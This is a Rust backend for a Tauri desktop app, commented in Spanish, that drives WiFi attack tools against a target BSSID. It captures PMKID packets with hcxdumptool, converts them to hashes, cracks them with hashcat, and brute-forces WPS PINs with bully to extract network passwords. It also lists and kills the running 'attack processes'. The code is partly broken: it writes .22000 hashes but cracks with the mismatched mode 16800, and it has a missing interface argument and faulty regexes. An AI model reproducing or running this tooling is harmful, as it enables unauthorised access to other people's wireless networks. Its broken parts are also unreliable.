use serde::Serialize;
use tauri::{command, AppHandle};
use tauri_plugin_shell::{process::Output, ShellExt};

// ═══════════════════════════════════════════════════════════════════════════════
// PATHS
// ═══════════════════════════════════════════════════════════════════════════════
fn tool_path(var: &str, fallback: &str) -> std::path::PathBuf {
    std::env::var(var).unwrap_or_else(|_| fallback.to_string()).into()
}

// ═══════════════════════════════════════════════════════════════════════════════
// MODELOS
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize)]
pub struct WifiNetwork {
    pub ssid:     String,
    pub bssid:    Option<String>,
    pub signal:   Option<u8>,
    pub channel:  Option<u8>,
    pub security: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct ScanResult {
    pub networks: Vec<WifiNetwork>,
    pub error:    Option<String>,
}
impl ScanResult {
    fn ok(nets: Vec<WifiNetwork>) -> Self { Self { networks: nets, error: None } }
    fn err(msg: &str) -> Self { Self { networks: vec![], error: Some(msg.into()) } }
}

#[derive(Debug, Clone, Serialize)]
pub struct CmdResponse {
    pub success:    bool,
    pub output:     String,
    pub stderr:     String,
    pub exit_code:  Option<i32>,
}

macro_rules! re {
    ($re:expr) => { once_cell::sync::Lazy::new(|| regex::Regex::new($re).unwrap()) };
}
static RE_SSID:   once_cell::sync::Lazy<regex::Regex> = re!(r"^SSID\s+\d+\s*:\s*(.*)");
static RE_NEW_ID: once_cell::sync::Lazy<regex::Regex> = re!(r"^SSID\s+\d+\s*:");
static RE_BSSID:  once_cell::sync::Lazy<regex::Regex> = re!(r"^BSSID\s+\d*\s*:\s*([0-9A-Fa-f:]{17})");
static RE_SIG:    once_cell::sync::Lazy<regex::Regex> = re!(r"Signal|Señal:\s*(\d+)%");
static RE_CHAN:   once_cell::sync::Lazy<regex::Regex> = re!(r"Channel|Canal:\s*(\d+)");
static RE_SEC:    once_cell::sync::Lazy<regex::Regex> =
    re!(r"(?:Authentication|Seguridad|Autenticaci[oó]n|Tipo de autenticaci[oó]n)\s*:\s*(.*)");

// ═══════════════════════════════════════════════════════════════════════════════
// PARSEADOR NETSH
// ═══════════════════════════════════════════════════════════════════════════════

fn parse_netsh(raw: &str) -> Vec<WifiNetwork> {
    let mut nets = vec![];
    let mut lines = raw.lines().peekable();

    while let Some(line) = lines.next() {
        let caps = match RE_SSID.captures(line.trim()) {
            Some(c) => c, None => continue,
        };
        let mut ssid     = caps[1].trim().to_string();
        let mut bssid    = None;
        let mut signal   = None;
        let mut channel  = None;
        let mut security = String::from("Abierta");

        'block: while let Some(sub) = lines.peek() {
            let s = sub.trim();
            if RE_NEW_ID.is_match(s) { break 'block; }
            lines.next();
            if let Some(c) = RE_BSSID.captures(s) { bssid = Some(c[1].to_uppercase()); }
            else if let Some(c) = RE_SIG.captures(s) { if let Ok(n) = c[1].parse() { signal = Some(n); } }
            else if let Some(c) = RE_CHAN.captures(s) { if let Ok(n) = c[1].parse() { channel = Some(n); } }
            else if let Some(c) = RE_SEC.captures(s) {
                let sec = c[1].trim();
                if !sec.is_empty() { security = sec.to_string(); }
            }
        }
        if ssid.is_empty() && bssid.is_some() { ssid = "Red oculta".into(); }
        nets.push(WifiNetwork { ssid, bssid, signal, channel, security });
    }
    nets
}

// ═══════════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════════

/// Ejecuta un binario externo y devuelve su salida
async fn run_bin(app: &AppHandle, exe: &str, args: &[String]) -> CmdResponse {
    let shell = app.shell();
    let arg_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
    match shell.command(exe).args(&arg_refs).output().await {
        Ok(data) => CmdResponse {
            success:   data.status.success(),
            output:    String::from_utf8_lossy(&data.stdout).into_owned(),
            stderr:    String::from_utf8_lossy(&data.stderr).into_owned(),
            exit_code: data.status.code(),
        },
        Err(e) => CmdResponse {
            success: false, output: String::new(),
            stderr: e.to_string(), exit_code: None,
        },
    }
}

fn wrap(title: &str, body: &str, ok: bool) -> String {
    let icon = if ok { "\u{2705}" } else { "\u{274C}" };
    format!("{} {}\n{}", icon, title, body)
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 1 — ESCANEAR (existente, intacto)
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn scan_wifi(app: AppHandle) -> ScanResult {
    let shell = app.shell();
    let out: Output = match shell
        .command("powershell")
        .args(["-NoProfile", "-Command", "netsh wlan show networks mode=bssid"])
        .output().await { Ok(o) => o, Err(e) => return ScanResult::err(&e.to_string()), };

    ScanResult::ok(parse_netsh(&String::from_utf8_lossy(&out.stdout)))
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 2 — CAPTURAR PMKID  (hcxdumptool)
// ═══════════════════════════════════════════════════════════════════════════════
/// Ejecuta hcxdumptool capturando paquetes PMKID de un BSSID específico.
/// Guarda el archivo .pcapng en el directorio actual.
#[command]
pub async fn pmkid_capture(app: AppHandle, bssid: String, channel: Option<u8>, duration_seconds: Option<u64>) -> CmdResponse {
    let prog  = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
    let ch    = channel.unwrap_or(1);
    let dur   = duration_seconds.unwrap_or(120);
    let outfile = format!("capture_{}.pcapng", bssid.replace(':', ""));

    let mut args = vec![
        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
        "-i".into(),
        "-t".into(), dur.to_string(),
        "-w".into(), outfile.clone(),
        "--bssid".into(), bssid.clone(),
    ];
    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }

    let r        = run_bin(&app, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
    let body     = format!("Binario: {}\nArchivo: {}\n\n{}", prog.display(), outfile, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("PMKID Capture \u{00B7} {} \u{00B7} Canal={} \u{00B7} {}s", bssid, ch, dur), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 3 — CONVERTIR PMKID → HASH  (hcxpcapngtool)
// ═══════════════════════════════════════════════════════════════════════════════
/// Extrae hashes PMKID de un .pcapng y genera un archivo .22000 listo para hashcat.
#[command]
pub async fn pmkid_convert(_app: AppHandle, pcapng_path: String, output_dir: Option<String>) -> CmdResponse {
    let prog    = tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe");
    let out_dir = output_dir.as_deref().unwrap_or(".");
    let stem    = std::path::Path::new(&pcapng_path).file_stem().and_then(|s| s.to_str()).unwrap_or("out");
    let hash_file = format!("{}/{}.22000", out_dir, stem);

    let args = vec!["-o".into(), hash_file.clone(), pcapng_path.clone()];
    let r    = run_bin(&_app, prog.to_str().unwrap_or("hcxpcapngtool.exe"), &args).await;
    let body = format!("Input: {}\nOutput: {}\n\n{}", pcapng_path, hash_file, r.output);
    CmdResponse { success: r.success, output: wrap(&format!("PMKID Convert \u{00B7} {pcapng_path}"), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 4 — CRACK PMKID  (hashcat)
// ═══════════════════════════════════════════════════════════════════════════════
/// Fuerza bruta sobre hashes .22000 con hashcat (modo 16800 = PBKDF2-SHA512-PMKID).
/// -a 0 = straight, -a 3 = brute-force, -a 6 = dictionary + rule.
#[command]
pub async fn pmkid_crack(app: AppHandle, hash_file: String, wordlist: Option<String>, attack_mode: Option<u8>) -> CmdResponse {
    let prog     = tool_path("HASHCAT_PATH", "hashcat.exe");
    let wordlist_bin = wordlist.clone().unwrap_or_else(|| tool_path("WORDLIST_PATH", "wordlist.txt").to_string_lossy().into_owned());
    let mode     = attack_mode.unwrap_or(0);
    let cracked_out = format!("{}.cracked", hash_file);

    let args = vec![
        "-m".into(), "16800".into(),
        "-a".into(), mode.to_string(),
        "-o".into(), cracked_out.clone(),
        "--force".into(),
        hash_file.clone(),
        wordlist_bin.clone(),
    ];
    let r = run_bin(&app, prog.to_str().unwrap_or("hashcat.exe"), &args).await;

    let pw_opt   = r.output.lines().find(|l| l.contains(':')).map(|s| s.to_string());
    let body = if let Some(ref p) = pw_opt {
        format!("\u{1F512} PASSWORD: {}\n\n{}", p, r.output)
    } else {
        format!("Sin resultado aún. Hash: {}\nModo: {}  Wordlist: {}\n\n{}", hash_file, mode, wordlist_bin, r.output)
    };
    CmdResponse { success: pw_opt.is_some() || r.success, output: wrap(&format!("PMKID Crack \u{00B7} {hash_file}"), &body, pw_opt.is_some()), stderr: r.stderr, exit_code: r.exit_code }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 5 — WPS PIN BRUTEFORCE  (bully)
// ═══════════════════════════════════════════════════════════════════════════════
/// Ejecuta bully para extraer el PIN WPS y la PSK de una red objetivo.
#[command]
pub async fn wps_pin_bruteforce(app: AppHandle, bssid: String, interface: String) -> CmdResponse {
    let prog = tool_path("BULLY_PATH", "bully.exe");
    let args = vec!["-b".into(), bssid.clone(), interface.clone()];
    let r    = run_bin(&app, prog.to_str().unwrap_or("bully.exe"), &args).await;

    let summary = if r.output.to_lowercase().contains("pin:") {
        let pins: Vec<_> = r.output.lines().filter(|l| l.to_lowercase().contains("pin:")).collect();
        let psks: Vec<_> = r.output.lines().filter(|l| l.to_lowercase().contains("psk:")).collect();
        let mut s = format!("PIN encontrado:\n{}", pins.join("\n"));
        if !psks.is_empty() { s.push_str(&format!("\nPSK encontrada:\n{}", psks.join("\n"))); }
        s
    } else {
        "bully ejecutado. Revisa la salida para el progreso del PIN.".into()
    };

    CmdResponse {
        success:    false,
        output:     wrap(&format!("WPS Bruteforce \u{00B7} {} \u{00B7} {interface}", bssid), &summary, false),
        stderr:     r.stderr,
        exit_code:  r.exit_code,
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 6 — SCAN AIRODUMP-STYLE  (netsh estructurado)
// ═══════════════════════════════════════════════════════════════════════════════
/// Escaneo con filtros opcionales. Devuelve salida de Netsh parseable
/// cuando airodump-ng no esté disponible en Windows.
#[command]
pub async fn scan_airodump(app: AppHandle, bssid_filter: Option<String>, channel_filter: Option<u8>, _duration: Option<u64>) -> CmdResponse {
    let shell = app.shell();

    let ps_args: Vec<String> = vec!["-NoProfile".into(), "-Command".into(), "netsh wlan show networks mode=bssid".into()];

    if let Some(_ch) = channel_filter { }

    let ps_out = match shell.command("powershell").args(&ps_args).output().await {
        Ok(o) => String::from_utf8_lossy(&o.stdout).into_owned(),
        Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None },
    };

    let mut summary = String::from("[Airodump-style scan]\n");
    if let Some(ref b) = bssid_filter { summary.push_str(&format!("Filtro BSSID: {}\n", b)); }
    if let Some(ch) = channel_filter     { summary.push_str(&format!("Canal: {}\n", ch)); }
    summary.push_str("\n--- netsh raw ---\n");
    summary.push_str(&ps_out);
    summary.push_str("\n--- fin ---\n");

    CmdResponse { success: true, output: summary, stderr: String::new(), exit_code: Some(0) }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 7 — ESTADO DE INTERFAZ WiFi
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn wifi_interface_status(_app: AppHandle) -> CmdResponse {
    let shell = _app.shell();
    let ps = "Get-NetAdapter | Where-Object {$_.MediaType -eq 'Native 802.11'} | Format-Table -AutoSize";
    let out = match shell.command("powershell").args(["-NoProfile", "-Command", ps]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: out.status.success(), output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::from_utf8_lossy(&out.stderr).into_owned(), exit_code: out.status.code() }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 8 — LISTAR PROCESOS DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn list_attack_processes(_app: AppHandle) -> CmdResponse {
    let shell = _app.shell();
    let ps = "Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.ProcessName -match 'hcxdumptool|hashcat|bully|reaver'} | Format-Table Id, ProcessName, Path -AutoSize";
    let out = match shell.command("powershell").args(["-NoProfile", "-Command", ps]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: true, output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::new(), exit_code: out.status.code() }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMANDO 9 — MATAR PROCESO DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════════
#[command]
pub async fn kill_attack_process(_app: AppHandle, pid: u32) -> CmdResponse {
    let shell = _app.shell();
    let cmd   = format!("taskkill /PID {} /F /T", pid);
    let out   = match shell.command("powershell").args(["-NoProfile", "-Command", &cmd]).output().await { Ok(o) => o, Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None } };
    CmdResponse { success: out.status.success(), output: String::from_utf8_lossy(&out.stdout).into_owned(), stderr: String::from_utf8_lossy(&out.stderr).into_owned(), exit_code: out.status.code() }
}
